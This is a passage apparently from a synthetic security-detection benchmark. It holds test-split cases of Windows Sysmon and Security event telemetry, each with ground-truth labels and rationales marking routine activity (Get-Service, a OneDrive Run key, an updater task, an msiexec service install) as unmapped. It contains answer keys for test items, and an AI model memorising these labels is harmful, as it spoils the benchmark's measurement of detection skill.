    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Get-Service -Name maple_holly_birch_191d13\"",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
    "LogonId": "0xd00d",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
    "ParentProcessId": 53264,
    "ProcessGuid": "{d439e7c5-ddf0-69ce-afda-f2fe7f4c692a}",
    "ProcessId": 53260,
    "User": "jsmith",
    "UtcTime": "2026-06-14T00:00:45Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_PS/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1e6d758c",
        "fields": [
          "CommandLine",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "PowerShell inventory is ordinary administration with no obfuscation, transfer, or persistence evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_37fb0fe1"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_e4bd0d1d",
    "event_record_id": 62452010346484,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=f7aaf81985dcec41b3291810c21cf2ebfb4d2716e7dea503aa6d349321504560",
      "Image": "C:\\Windows\\System32\\taskeng.exe",
      "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
      "LogonId": "0xd00d",
      "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe",
      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
      "ParentProcessGuid": "{b6f06737-7c60-9f42-2e2d-2f2d8ebb49cc}",
      "ParentProcessId": 53256,
      "ProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
      "ProcessId": 53264,
      "User": "jsmith",
      "UtcTime": "2026-06-14T00:00:42Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-14T00:00:42Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_1e6d758c",
    "event_record_id": 233345166728688,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Get-Service -Name maple_holly_birch_191d13\"",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
      "LogonId": "0xd00d",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
      "ParentProcessId": 53264,
      "ProcessGuid": "{d439e7c5-ddf0-69ce-afda-f2fe7f4c692a}",
      "ProcessId": 53260,
      "User": "jsmith",
      "UtcTime": "2026-06-14T00:00:45Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-14T00:00:45Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=f7aaf81985dcec41b3291810c21cf2ebfb4d2716e7dea503aa6d349321504560",
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
    "LogonId": "0xd00d",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentProcessGuid": "{b6f06737-7c60-9f42-2e2d-2f2d8ebb49cc}",
    "ParentProcessId": 53256,
    "ProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
    "ProcessId": 53264,
    "User": "jsmith",
    "UtcTime": "2026-06-14T00:00:42Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Get-Service -Name maple_holly_birch_191d13\"",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
    "LogonId": "0xd00d",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
    "ParentProcessId": 53264,
    "ProcessGuid": "{d439e7c5-ddf0-69ce-afda-f2fe7f4c692a}",
    "ProcessId": 53260,
    "User": "jsmith",
    "UtcTime": "2026-06-14T00:00:45Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_PS/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1e6d758c",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ParentImage"
        ]
      },
      {
        "event_id": "evt_e4bd0d1d",
        "fields": [
          "Computer",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The taskeng parent and routine Get-Service invocation match the approved synthetic service-inventory case; external authorization is not independently recorded.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_262c8cb7"
}
```

## pair_0d39836f
Family: TF_UNMAP_REG; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_33fe1bd9",
    "event_record_id": 230460161054859,
    "fields": {
      "Computer": "WEB01",
      "Details": "C:\\Program Files\\OneDrive\\OneDrive.exe /profile cedar_ash_birch_0d3983",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
      "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
      "ProcessId": 9360,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive_cedar_ash_birch_0d3983",
      "User": "jsmith",
      "UtcTime": "2026-04-20T04:39:08Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-20T04:39:08Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "Details": "C:\\Program Files\\OneDrive\\OneDrive.exe /profile cedar_ash_birch_0d3983",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
    "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
    "ProcessId": 9360,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive_cedar_ash_birch_0d3983",
    "User": "jsmith",
    "UtcTime": "2026-04-20T04:39:08Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_REG/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_33fe1bd9",
        "fields": [
          "Details",
          "Image",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The Run key names the OneDrive application path; signer authenticity is not established by the available telemetry.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_83ec835f"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_1bf0da68",
    "event_record_id": 66126054977469,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /profile cedar_ash_birch_0d3983",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=5903aa86369375e5f9d845e7914a812bbb3f0ed451df0cfa26af3a27fc8eef5d",
      "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
      "LogonGuid": "{59fa7496-9d1d-bc18-eb6e-83811e4e3141}",
      "LogonId": "0x248d",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{7c01f710-17d8-902f-0cc4-8b83d5427230}",
      "ParentProcessId": 9352,
      "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
      "ProcessId": 9360,
      "User": "jsmith",
      "UtcTime": "2026-04-20T04:39:05Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-20T04:39:05Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_33fe1bd9",
    "event_record_id": 230460161054859,
    "fields": {
      "Computer": "WEB01",
      "Details": "C:\\Program Files\\OneDrive\\OneDrive.exe /profile cedar_ash_birch_0d3983",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
      "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
      "ProcessId": 9360,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive_cedar_ash_birch_0d3983",
      "User": "jsmith",
      "UtcTime": "2026-04-20T04:39:08Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-20T04:39:08Z",
    "windows_event_id": 13
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /profile cedar_ash_birch_0d3983",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=5903aa86369375e5f9d845e7914a812bbb3f0ed451df0cfa26af3a27fc8eef5d",
    "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
    "LogonGuid": "{59fa7496-9d1d-bc18-eb6e-83811e4e3141}",
    "LogonId": "0x248d",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{7c01f710-17d8-902f-0cc4-8b83d5427230}",
    "ParentProcessId": 9352,
    "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
    "ProcessId": 9360,
    "User": "jsmith",
    "UtcTime": "2026-04-20T04:39:05Z"
  },
  {
    "Computer": "WEB01",
    "Details": "C:\\Program Files\\OneDrive\\OneDrive.exe /profile cedar_ash_birch_0d3983",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Program Files\\OneDrive\\OneDrive.exe",
    "ProcessGuid": "{3c242c04-6fbd-b8f9-dc1c-792f32eca0f8}",
    "ProcessId": 9360,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive_cedar_ash_birch_0d3983",
    "User": "jsmith",
    "UtcTime": "2026-04-20T04:39:08Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_REG/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_33fe1bd9",
        "fields": [
          "Computer",
          "Details",
          "Image",
          "TargetObject"
        ]
      },
      {
        "event_id": "evt_1bf0da68",
        "fields": [
          "Computer",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The Run-key value and related OneDrive process-creation record share the target path; signer authenticity and authorized ownership are not established.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_fbbdc084"
}
```

## pair_0e95e1c1
Family: TF_UNMAP_SCHTASK; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_1e07b4ef",
    "event_record_id": 177239468346260,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0xfb15",
      "SubjectUserName": "SYSTEM",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe</Command><Arguments>--package willow_birch_pine_0e95e1</Arguments></Exec></Actions></Task>",
      "TaskName": "\\UpdateCheck_willow_birch_pine_0e95e1",
      "TimeCreated": "2026-06-09T00:50:28Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-09T00:50:28Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0xfb15",
    "SubjectUserName": "SYSTEM",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe</Command><Arguments>--package willow_birch_pine_0e95e1</Arguments></Exec></Actions></Task>",
    "TaskName": "\\UpdateCheck_willow_birch_pine_0e95e1",
    "TimeCreated": "2026-06-09T00:50:28Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_SCHTASK/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1e07b4ef",
        "fields": [
          "SubjectUserName",
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The task content records an updater invocation under ProgramData tied to maintenance context; no signer telemetry is present.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_d1e36f24"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_1e07b4ef",
    "event_record_id": 177239468346260,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0xfb15",
      "SubjectUserName": "SYSTEM",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe</Command><Arguments>--package willow_birch_pine_0e95e1</Arguments></Exec></Actions></Task>",
      "TaskName": "\\UpdateCheck_willow_birch_pine_0e95e1",
      "TimeCreated": "2026-06-09T00:50:28Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-09T00:50:28Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_11077910",
    "event_record_id": 59175289972607,
    "fields": {
      "CommandLine": "C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe --package willow_birch_pine_0e95e1",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=00f1287872fa28d7f160d3c1016172f13aa59dd12cf19d9d1b160dc7d4861321",
      "Image": "C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe",
      "LogonGuid": "{0af16bb3-40a0-5c64-5445-abe9538ec205}",
      "LogonId": "0xfb15",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{870a86ca-51dd-45bb-7e48-4a482b76ca49}",
      "ParentProcessId": 64272,
      "ProcessGuid": "{35d1d223-677f-1fa5-9c5d-cca5aa481df4}",
      "ProcessId": 64280,
      "User": "SYSTEM",
      "UtcTime": "2026-06-09T00:50:31Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-09T00:50:31Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0xfb15",
    "SubjectUserName": "SYSTEM",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe</Command><Arguments>--package willow_birch_pine_0e95e1</Arguments></Exec></Actions></Task>",
    "TaskName": "\\UpdateCheck_willow_birch_pine_0e95e1",
    "TimeCreated": "2026-06-09T00:50:28Z"
  },
  {
    "CommandLine": "C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe --package willow_birch_pine_0e95e1",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=00f1287872fa28d7f160d3c1016172f13aa59dd12cf19d9d1b160dc7d4861321",
    "Image": "C:\\ProgramData\\willow_birch_pine_0e95e1\\updater.exe",
    "LogonGuid": "{0af16bb3-40a0-5c64-5445-abe9538ec205}",
    "LogonId": "0xfb15",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{870a86ca-51dd-45bb-7e48-4a482b76ca49}",
    "ParentProcessId": 64272,
    "ProcessGuid": "{35d1d223-677f-1fa5-9c5d-cca5aa481df4}",
    "ProcessId": 64280,
    "User": "SYSTEM",
    "UtcTime": "2026-06-09T00:50:31Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_SCHTASK/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1e07b4ef",
        "fields": [
          "Computer",
          "SubjectUserName",
          "TaskContent",
          "TaskName"
        ]
      },
      {
        "event_id": "evt_11077910",
        "fields": [
          "Computer",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The task configuration and matching updater process-creation record are consistent with the synthetic maintenance case; these records do not establish task causality or signer authenticity.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_2cd470d3"
}
```

## pair_09566938
Family: TF_UNMAP_SVC; split: test
Transition: ambiguous -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_4c64b565",
    "event_record_id": 212499324783503,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 4697,
      "ServiceAccount": "LocalService",
      "ServiceFileName": "C:\\ProgramData\\yew_fir_spruce_095669\\patch.exe --package yew_fir_spruce_095669",
      "ServiceName": "PatchService_yew_fir_spruce_095669",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION02",
      "SubjectLogonId": "0x8fc9",
      "SubjectUserName": "wlee",
      "TimeCreated": "2026-03-23T21:53:17Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-23T21:53:17Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION02",
    "EventID": 4697,
    "ServiceAccount": "LocalService",
    "ServiceFileName": "C:\\ProgramData\\yew_fir_spruce_095669\\patch.exe --package yew_fir_spruce_095669",
    "ServiceName": "PatchService_yew_fir_spruce_095669",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION02",
    "SubjectLogonId": "0x8fc9",
    "SubjectUserName": "wlee",
    "TimeCreated": "2026-03-23T21:53:17Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_SVC/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_4c64b565",
        "fields": [
          "ServiceAccount",
          "ServiceFileName",
          "ServiceName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 4697 records a LocalService service configuration pointing under ProgramData; the single event does not identify deployment authorization or runtime execution.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_f9b0869f"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_da42d151",
    "event_record_id": 199208067870074,
    "fields": {
      "CommandLine": "msiexec.exe /i C:\\Packages\\yew_fir_spruce_095669\\PatchService.msi /qn",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0x8fcc",
      "NewProcessName": "C:\\Windows\\System32\\msiexec.exe",
      "ParentProcessName": "C:\\Windows\\CCM\\CcmExec.exe",
      "ProcessId": "0x8fc4",
      "SubjectLogonId": "0x8fc9",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-03-23T21:53:14Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-23T21:53:14Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_4c64b565",
    "event_record_id": 212499324783503,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 4697,
      "ServiceAccount": "LocalService",
      "ServiceFileName": "C:\\ProgramData\\yew_fir_spruce_095669\\patch.exe --package yew_fir_spruce_095669",
      "ServiceName": "PatchService_yew_fir_spruce_095669",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION02",
      "SubjectLogonId": "0x8fc9",
      "SubjectUserName": "wlee",
      "TimeCreated": "2026-03-23T21:53:17Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-23T21:53:17Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "msiexec.exe /i C:\\Packages\\yew_fir_spruce_095669\\PatchService.msi /qn",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0x8fcc",
    "NewProcessName": "C:\\Windows\\System32\\msiexec.exe",
    "ParentProcessName": "C:\\Windows\\CCM\\CcmExec.exe",
    "ProcessId": "0x8fc4",
    "SubjectLogonId": "0x8fc9",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-03-23T21:53:14Z"
  },
  {
    "Computer": "WORKSTATION02",
    "EventID": 4697,
    "ServiceAccount": "LocalService",
    "ServiceFileName": "C:\\ProgramData\\yew_fir_spruce_095669\\patch.exe --package yew_fir_spruce_095669",
    "ServiceName": "PatchService_yew_fir_spruce_095669",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION02",
    "SubjectLogonId": "0x8fc9",
    "SubjectUserName": "wlee",
    "TimeCreated": "2026-03-23T21:53:17Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_SVC/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_4c64b565",
        "fields": [
          "Computer",
          "ServiceAccount",
          "ServiceFileName",
          "ServiceName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_da42d151",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The CcmExec.exe parent, msiexec process-creation record referencing a package path, temporal order, and host linkage are consistent with an enterprise deployment workflow; they do not independently prove authorization.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_1098fdc1"
}
```
